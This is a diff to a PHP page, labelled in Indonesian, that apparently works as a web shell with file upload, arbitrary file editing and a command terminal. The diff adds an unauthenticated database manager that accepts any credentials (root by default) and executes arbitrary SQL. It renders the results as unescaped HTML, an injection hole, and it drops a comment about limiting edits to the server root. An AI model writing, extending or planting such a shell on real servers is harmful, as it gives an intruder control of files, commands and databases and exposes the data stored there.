@@ -6,6 +6,62 @@ if (!$dir || !is_dir($dir)) { $dir = realpath('./'); }
 
 $pesanAksi = "";
 
+// 0. PROSES DATABASE MANAGER (AJAX / POST)
+if (isset($_POST['db_action'])) {
+    header('Content-Type: application/json; charset=utf-8');
+    $conn_type = $_POST['db_conn'] ?? 'mysql';
+    $host      = $_POST['db_host'] ?? '127.0.0.1';
+    $port      = $_POST['db_port'] ?? '3306';
+    $db        = $_POST['db_name'] ?? '';
+    $user      = $_POST['db_user'] ?? 'root';
+    $pass      = $_POST['db_pass'] ?? '';
+    $action    = $_POST['db_action'] ?? 'test';
+    $query     = trim($_POST['db_query'] ?? '');
+
+    try {
+        if ($conn_type === 'sqlite') {
+            $pdo = new PDO("sqlite:" . $db);
+        } else {
+            $dsn = "mysql:host=$host;port=$port;charset=utf8mb4";
+            if ($db !== '') $dsn .= ";dbname=$db";
+            $pdo = new PDO($dsn, $user, $pass, [
+                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
+            ]);
+        }
+
+        if ($action === 'test') {
+            echo json_encode(['ok' => true, 'message' => 'Koneksi Database Berhasil!']);
+        } elseif ($action === 'tables') {
+            if ($conn_type === 'sqlite') {
+                $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
+            } else {
+                $stmt = $pdo->query("SHOW TABLES");
+            }
+            $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
+            echo json_encode(['ok' => true, 'tables' => $tables]);
+        } elseif ($action === 'query') {
+            if ($query === '') {
+                echo json_encode(['ok' => false, 'error' => 'Query kosong.']);
+                exit;
+            }
+            $stmt = $pdo->prepare($query);
+            $stmt->execute();
+            $isSelect = (stripos($query, 'SELECT') === 0 || stripos($query, 'SHOW') === 0 || stripos($query, 'DESCRIBE') === 0);
+            if ($isSelect) {
+                $rows = $stmt->fetchAll();
+                $cols = count($rows) > 0 ? array_keys($rows[0]) : [];
+                echo json_encode(['ok' => true, 'columns' => $cols, 'rows' => $rows, 'count' => count($rows)]);
+            } else {
+                echo json_encode(['ok' => true, 'affected' => $stmt->rowCount(), 'message' => 'Query berhasil dieksekusi. Affected rows: ' . $stmt->rowCount()]);
+            }
+        }
+    } catch (Exception $e) {
+        echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
+    }
+    exit;
+}
+
 // 1. PROSES UPLOAD FILE
 if (isset($_POST['submit_upload']) && isset($_FILES['berkas'])) {
     $targetPath = $dir . DIRECTORY_SEPARATOR . basename($_FILES['berkas']['name']);
@@ -35,7 +91,6 @@ if (isset($_POST['submit_simpan_edit'])) {
     $targetFileEdit = $_POST['path_file_edit'] ?? '';
     $isiEditBaru = $_POST['isi_file_edit'] ?? '';
     
-    // Keamanan sederhana agar tidak keluar dari root direktori server jika diinginkan, atau sesuaikan
     if (!empty($targetFileEdit) && file_exists($targetFileEdit) && is_file($targetFileEdit)) {
         if (file_put_contents($targetFileEdit, $isiEditBaru) !== false) {
             $pesanAksi = "<span style='color:#0f0;'>File berhasil disimpan!</span>";
@@ -88,7 +143,7 @@ $modeBuatBaru = isset($_GET['newfile']);
         table { width: 100%; border-collapse: collapse; margin-top: 10px; background: #1e1e1e; }
         th, td { border: 1px solid #333; padding: 8px 12px; text-align: left; }
         th { background: #252525; }
-        input[type=text], input[type=file], textarea { background: #1e1e1e; color: #fff; border: 1px solid #444; padding: 8px; width: 100%; box-sizing: border-box; }
+        input[type=text], input[type=password], input[type=file], textarea, select { background: #1e1e1e; color: #fff; border: 1px solid #444; padding: 8px; width: 100%; box-sizing: border-box; }
         button, .btn { background: #0066cc; color: #fff; border: none; padding: 6px 12px; cursor: pointer; border-radius: 3px; font-family: monospace; }
         button:hover, .btn:hover { background: #0052a3; }
         .btn-red { background: #cc0000; }
@@ -98,6 +153,11 @@ $modeBuatBaru = isset($_GET['newfile']);
         pre { background: #000; color: #00ff00; padding: 15px; border-radius: 4px; overflow-x: auto; }
         .card { background: #1e1e1e; border: 1px solid #333; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
         .actions-group { display: flex; gap: 5px; }
+        .db-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; margin-bottom: 10px; }
+        #dbOut { background:#08080a; border:1px solid #1e1e24; border-radius:6px; color:#7ee787; padding:12px; min-height:100px; max-height:40vh; overflow:auto; font-size:12px; margin-top: 10px; }
+        table.db-table { width:100%; border-collapse:collapse; margin-top:8px; }
+        table.db-table th, table.db-table td { border:1px solid #2a2a30; padding:6px 8px; font-size:11.5px; text-align:left; }
+        table.db-table th { background:#141418; color:#9ad; }
     </style>
 </head>
 <body>
@@ -115,7 +175,7 @@ $modeBuatBaru = isset($_GET['newfile']);
         <p><small><?php echo htmlspecialchars($fileTargetEdit); ?></small></p>
         <form method="post">
             <input type="hidden" name="path_file_edit" value="<?php echo htmlspecialchars($fileTargetEdit); ?>">
-            <textarea name="isi_file_edit" rows="15" style="width:15; font-family:monospace;"><?php echo htmlspecialchars($kontenFileEdit); ?></textarea><br><br>
+            <textarea name="isi_file_edit" rows="15" style="font-family:monospace;"><?php echo htmlspecialchars($kontenFileEdit); ?></textarea><br><br>
             <button type="submit" name="submit_simpan_edit" class="btn-green">💾 Simpan Perubahan</button>
             <a href="?dir=<?php echo urlencode(dirname($fileTargetEdit)); ?>" class="btn" style="background:#555;">Kembali</a>
         </form>
@@ -136,6 +196,47 @@ $modeBuatBaru = isset($_GET['newfile']);
         </form>
     </div>
     <?php endif; ?>
+
+    <!-- DATABASE MANAGER (MySQL / PDO) -->
+    <div class="card">
+        <h3>Database Manager (PDO MySQL)</h3>
+        <div class="db-grid">
+            <div>
+                <label><small>DB_CONNECTION</small></label>
+                <input id="db_conn" value="mysql">
+            </div>
+            <div>
+                <label><small>DB_HOST</small></label>
+                <input id="db_host" value="127.0.0.1">
+            </div>
+            <div>
+                <label><small>DB_PORT</small></label>
+                <input id="db_port" value="3306">
+            </div>
+            <div>
+                <label><small>DB_DATABASE</small></label>
+                <input id="db_name" placeholder="nama_db">
+            </div>
+            <div>
+                <label><small>DB_USERNAME</small></label>
+                <input id="db_user" value="root">
+            </div>
+            <div>
+                <label><small>DB_PASSWORD</small></label>
+                <input id="db_pass" type="password" placeholder="password">
+            </div>
+        </div>
+        <div class="row" style="margin-bottom: 10px; display: flex; gap: 8px;">
+            <button type="button" onclick="dbAction('test')" class="btn">Test Koneksi</button>
+            <button type="button" onclick="dbAction('tables')" class="btn">Lihat Tabel</button>
+            <span id="dbStatus" class="meta" style="align-self: center; color: #aaa;"></span>
+        </div>
+        <div class="row" style="display: flex; gap: 8px;">
+            <textarea id="dbQuery" placeholder="SELECT * FROM nama_tabel LIMIT 10;" style="flex:1; height:60px; resize:vertical;"></textarea>
+            <button type="button" onclick="dbAction('query')" class="btn btn-green" style="height:60px;">Jalankan Query</button>
+        </div>
+        <div id="dbOut">Output database akan muncul di sini...</div>
+    </div>
 
     <!-- TERMINAL SHELL -->
     <div class="card">
@@ -230,6 +331,63 @@ $modeBuatBaru = isset($_GET['newfile']);
     <script>
         function setCmd(cmd) {
             document.querySelector('input[name="command"]').value = cmd;
+        }
+
+        async function dbAction(action) {
+            const statusEl = document.getElementById('dbStatus');
+            const outEl = document.getElementById('dbOut');
+            
+            statusEl.textContent = 'Memproses...';
+            outEl.textContent = 'Loading...';
+
+            const formData = new URLSearchParams();
+            formData.append('db_action', action);
+            formData.append('db_conn', document.getElementById('db_conn').value);
+            formData.append('db_host', document.getElementById('db_host').value);
+            formData.append('db_port', document.getElementById('db_port').value);
+            formData.append('db_name', document.getElementById('db_name').value);
+            formData.append('db_user', document.getElementById('db_user').value);
+            formData.append('db_pass', document.getElementById('db_pass').value);
+            formData.append('db_query', document.getElementById('dbQuery').value);
+
+            try {
+                const response = await fetch(window.location.href, {
+                    method: 'POST',
+                    body: formData
+                });
+                const res = await response.json();
+                
+                if (!res.ok) {
+                    statusEl.textContent = 'Gagal';
+                    outEl.textContent = 'ERROR: ' + res.error;
+                    return;
+                }
+
+                statusEl.textContent = 'Berhasil';
+                if (action === 'test' || (action === 'query' && res.message)) {
+                    outEl.textContent = res.message || JSON.stringify(res, null, 2);
+                } else if (action === 'tables') {
+                    outEl.innerHTML = '<b>Daftar Tabel:</b><br>' + res.tables.map(t => 
+                        `<a href="#" onclick="document.getElementById('dbQuery').value='SELECT * FROM ' + this.textContent + ' LIMIT 50; dbAction(\\'query\\'); return false;" style="color:#7aa2f7; display:inline-block; margin-right:15px;">${t}</a>`
+                    ).join('');
+                } else if (action === 'query' && res.rows) {
+                    if (res.rows.length === 0) {
+                        outEl.textContent = 'Query berhasil, tetapi tidak ada baris (0 rows) yang dikembalikan.';
+                        return;
+                    }
+                    let html = `<table class="db-table"><tr>` + res.columns.map(c => `<th>${c}</th>`).join('') + `</tr>`;
+                    for (const row of res.rows) {
+                        html += `<tr>` + res.columns.map(c => `<td>${row[c] !== null ? row[c] : 'NULL'}</td>`).join('') + `</tr>`;
+                    }
+                    html += `</table>`;
+                    outEl.innerHTML = `Menampilkan ${res.count} baris:<br>` + html;
+                } else {
+                    outEl.textContent = JSON.stringify(res, null, 2);
+                }
+            } catch (e) {
+                statusEl.textContent = 'Error';
+                outEl.textContent = 'Gagal melakukan request AJAX ke server: ' + e.message;
+            }
         }
     </script>
 </body>
